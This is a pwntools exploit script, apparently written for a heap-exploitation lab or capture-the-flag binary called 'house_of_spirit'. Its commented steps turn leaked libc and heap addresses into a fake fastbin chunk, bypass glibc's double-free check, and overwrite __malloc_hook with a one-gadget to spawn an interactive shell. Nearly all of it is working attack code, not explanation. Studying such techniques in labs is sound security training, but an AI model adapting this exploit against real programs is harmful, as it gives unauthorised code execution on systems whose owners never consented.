#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_spirit")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size, data & chunk name.
# Returns chunk index.
def malloc(size, data, name):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.sendafter("name: ", name)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send the index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.timeout = 0.1

# =============================================================================

# Set the "age" field to 0x71, it will act as a fake chunk size field.
age = 0x71
io.sendafter("age: ", f"{age}")

# The 2nd qword of the "username" field will act as the fake chunk's succeeding size field.
# Set it to any value between 2*SIZE_SZ and av->system_mem.
username = pack(0) + pack(0x1234)
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request two chunks with any size (chunks A & C) and one chunk with size 0x70.
# The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field.
# Overflow pointers to chunk_A & chunk_C with the address of our fake chunk.
# Chunk_B is used to bypass the fastbins double-free mitigation.
chunk_A = malloc(0x18, "A"*8, b"A"*8 + pack(elf.sym.user + 0x10))
chunk_B = malloc(0x68, "B"*8, b"B"*8)
chunk_C = malloc(0x18, "C"*8, b"C"*8 + pack(elf.sym.user + 0x10))

# Coerce a double-free by freeing chunk_A, then chunk_B, then chunk_C.
# This way the fake chunk is not at the head of the 0x70 fastbin when it is freed for the second time,
# bypassing the fastbins double-free mitigation.
free(chunk_A) # Frees the fake chunk.
free(chunk_B)
free(chunk_C) # Double-frees the fake chunk.

# The next request for a 0x70-sized chunk will be serviced by the fake chunk.
# Request it, then overwrite its fastbin fd, pointing it near the the malloc hook,
# specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the
# least-significant byte of a size field.
malloc(0x68, pack(libc.sym.__malloc_hook - 0x23), "D"*8)

# Make two more requests for 0x70-sized chunks. The fake chunk, then chunk_B are allocated to
# service these requests.
malloc(0x68, "E"*8, "E"*8)
malloc(0x68, "F"*8, "F"*8)

# The next request for a 0x70-sized chunk is serviced by the fake chunk near the malloc hook.
# Use it to overwrite the malloc hook with the address of a one-gadget.
malloc(0x68, b"X"*0x13 + pack(libc.address + 0xe1fa1), "G"*8) # [rsp+0x50] == NULL

# The next call to malloc() will instead call the one-gadget and drop a shell.
# The argument to malloc() is irrelevant, as long as it passes the program's size check.
malloc(0x20, "", "")

# =============================================================================

io.interactive()
